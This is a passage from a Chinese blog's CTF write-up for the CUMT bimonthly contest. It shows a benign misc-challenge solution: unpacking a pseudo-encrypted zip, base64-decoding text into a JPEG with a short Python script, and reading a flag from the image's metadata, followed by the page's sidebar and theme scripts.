<p><img src="https://s2.ax1x.com/2019/05/02/EYqsIg.png" alt="img"></p>
<p>解压看到里面一张图片：</p>
<p><img src="https://s2.ax1x.com/2019/05/02/EYqhLV.png" alt="img"></p>
<p>试试 LSB 隐写：</p>
<p><img src="https://s2.ax1x.com/2019/05/02/EYLEOP.png" alt="img"></p>
<h3 id="真真假假"><a href="#真真假假" class="headerlink" title="真真假假"></a>真真假假</h3><p>给了一个压缩包，试试解压，但是需要密码。从题目推测可能是伪加密，拖到 Linux 下直接解压成功，有一个 <code>img.html</code> 文件，打开是一堆像是 base64 编码的字符。我们推测是一张图片，直接写个 Python 脚本将字符转成文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">sss = <span class="string">&quot;&quot;</span><span class="comment">#那一堆字符</span></span><br><span class="line">data = base64.b64decode(sss)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">file.write(data)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>使用 <code>file</code> 命令看看文件是什么格式：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ file <span class="number">1</span></span><br><span class="line"><span class="number">1</span>: JPEG image <span class="keyword">data</span>, JFIF standard <span class="number">1.01</span>, resolution (DPI), density <span class="number">72</span>x72, segment length <span class="number">16</span>, Exif Standard: [<span class="type">TIFF</span> <span class="type">image</span> <span class="type">data</span>, <span class="type">big</span>-<span class="type">endian</span>, <span class="type">direntries</span>=<span class="number">6</span>, <span class="type">orientation</span>=<span class="type">upper</span>-<span class="type">left</span>, <span class="type">software</span>=<span class="type">Adobe</span> <span class="type">Photoshop</span> <span class="number">7.0</span>, <span class="built_in">datetime</span>=<span class="number">2009</span>:<span class="number">11</span>:<span class="number">25</span> <span class="number">21</span>:<span class="number">24</span>:<span class="number">19</span>], baseline, precision <span class="number">8</span>, <span class="number">550</span>x550, frames <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>那我们加上扩展名 <code>.jpg</code>，打开看看，再看看属性：</p>
<p><img src="https://s2.ax1x.com/2019/05/04/Edp6S0.md.png" alt="img"></p>
<p>发现备注有看起来像 base64 编码的字符串，在线解下得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;h311o_tH1s_1S_f14g&#125;</span><br></pre></td></tr></table></figure>

  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/ctf/">ctf</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/ctf/">ctf</a><a href="/tags/CUMT双月赛三/">CUMT双月赛三</a>
  </div>

</div>



	<div class="article-share" id="share">
	
	  <div data-url="http://example.com/2019/05/01/%E5%A4%A7%E5%AD%A6CTF/CUMT%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%B8%89/" data-title="CUMT双月赛三 | Hexo" data-tsina="" class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2019/05/02/大学CTF/ISCC-2019/" title="ISCC_2019">
  <strong>上一篇：</strong><br/>
  <span>
  ISCC_2019</span>
</a>
</div>


<div class="next">
<a href="/2019/04/25/大学CTF/记攻防世界几个有意思的MISC/"  title="记攻防世界几个有意思的MISC">
 <strong>下一篇：</strong><br/> 
 <span>记攻防世界几个有意思的MISC
</span>
</a>
</div>

</nav>

	



</div>  
      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">Contents</strong>
 
 <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web%E7%AD%BE%E5%88%B01"><span class="toc-number">2.1.</span> <span class="toc-text">web签到1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E7%AD%BE%E5%88%B02"><span class="toc-number">3.</span> <span class="toc-text">Web签到2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass1"><span class="toc-number">3.2.</span> <span class="toc-text">bypass1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass2"><span class="toc-number">3.3.</span> <span class="toc-text">bypass2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass3"><span class="toc-number">3.4.</span> <span class="toc-text">bypass3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-number">3.5.</span> <span class="toc-text">exp：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number"></span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number"></span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0-1"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#where"><span class="toc-number">1.1.</span> <span class="toc-text">where</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#how"><span class="toc-number">1.2.</span> <span class="toc-text">how</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn3"><span class="toc-number">2.</span> <span class="toc-text">pwn3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#where-1"><span class="toc-number">2.1.</span> <span class="toc-text">where</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#how-1"><span class="toc-number">2.2.</span> <span class="toc-text">how</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number"></span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">古典密码签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0"><span class="toc-number">2.</span> <span class="toc-text">现代密码签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyxor"><span class="toc-number">3.</span> <span class="toc-text">easyxor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encode"><span class="toc-number">4.</span> <span class="toc-text">encode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA"><span class="toc-number">5.</span> <span class="toc-text">RSA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number"></span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Whoami"><span class="toc-number">1.</span> <span class="toc-text">Whoami???</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lisp"><span class="toc-number">2.</span> <span class="toc-text">Lisp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E5%AD%A6%E4%B8%80%E6%B3%A2%E8%AF%AD%E8%A8%80"><span class="toc-number">2.1.</span> <span class="toc-text">先学一波语言</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#define"><span class="toc-number">2.1.1.</span> <span class="toc-text">define</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#append"><span class="toc-number">2.1.2.</span> <span class="toc-text">append</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#pair"><span class="toc-number">2.1.3.</span> <span class="toc-text">pair</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#let"><span class="toc-number">2.1.4.</span> <span class="toc-text">let</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#car-amp-cdr"><span class="toc-number">2.1.5.</span> <span class="toc-text">car &amp; cdr</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cond"><span class="toc-number">2.1.6.</span> <span class="toc-text">cond</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#remainder"><span class="toc-number">2.1.7.</span> <span class="toc-text">remainder</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%90%86%E8%A7%A3%E4%BB%A3%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">理解代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-now"><span class="toc-number">2.3.</span> <span class="toc-text">Exploit now!</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">猜？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F%E7%9C%9F%E5%81%87%E5%81%87"><span class="toc-number">4.</span> <span class="toc-text">真真假假</span></a></li></ol>
 
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">

  


  
<div class="categorieslist">
	<p class="asidetitle">Categories</p>
		<ul>
		
		  
			<li><a href="/categories/CTF/" title="CTF">CTF<sup>10</sup></a></li>
		  
		
		  
			<li><a href="/categories/IoT/" title="IoT">IoT<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/Other/" title="Other">Other<sup>24</sup></a></li>
		  
		
		  
			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
		  
		
		  
			<li><a href="/categories/Sec/" title="Sec">Sec<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/ctf/" title="ctf">ctf<sup>21</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">Tags</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/ctf/" title="ctf">ctf<sup>21</sup></a></li>
			
		
			
				<li><a href="/tags/buuctf/" title="buuctf">buuctf<sup>6</sup></a></li>
			
		
			
				<li><a href="/tags/Java/" title="Java">Java<sup>5</sup></a></li>
			
		
			
				<li><a href="/tags/SQLi/" title="SQLi">SQLi<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/SQL/" title="SQL">SQL<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/Linux/" title="Linux">Linux<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/PHP绕过/" title="PHP绕过">PHP绕过<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/MYSQL比较特性/" title="MYSQL比较特性">MYSQL比较特性<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/SSRF/" title="SSRF">SSRF<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/java-WEB-INF/" title="java-WEB-INF">java-WEB-INF<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/无参数RCE/" title="无参数RCE">无参数RCE<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/模板注入/" title="模板注入">模板注入<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/IoT/" title="IoT">IoT<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/wifi密码破解/" title="wifi密码破解">wifi密码破解<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/安恒11月月赛/" title="安恒11月月赛">安恒11月月赛<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/cumt/" title="cumt">cumt<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/cumt双月赛一/" title="cumt双月赛一">cumt双月赛一<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/php变量覆盖/" title="php变量覆盖">php变量覆盖<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">Links</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
</div>

  <div class="weiboshow">
  <p class="asidetitle">Weibo</p>
    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
</div>


</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Good Good Study！ <br/>
			Day Day Up！</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
		
		<a href="/about" target="_blank" title="John Doe">John Doe</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>


<script type="text/javascript">
$(document).ready(function(){ 
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina'),
      description = $this.attr('description');
  var html = [
  '<div class="hoverqrcode clearfix"></div>',
  '<a class="overlay" id="qrcode"></a>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);

  $('.hoverqrcode').hide();

  var myWidth = 0;
  function updatehoverqrcode(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
    var qrsize = myWidth > 1024 ? 200:100;
    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
    var p = $('.article-share-qrcode').position();
    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
                          .qrcode(options);
  };
  $(window).resize(function(){
    $('.hoverqrcode').hide();
  });
  $('.article-share-qrcode').click(function(){
    updatehoverqrcode();
    $('.hoverqrcode').toggle();
  });
  $('.article-share-qrcode').hover(function(){}, function(){
      $('.hoverqrcode').hide();
  });
});   
</script>











<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
</html>
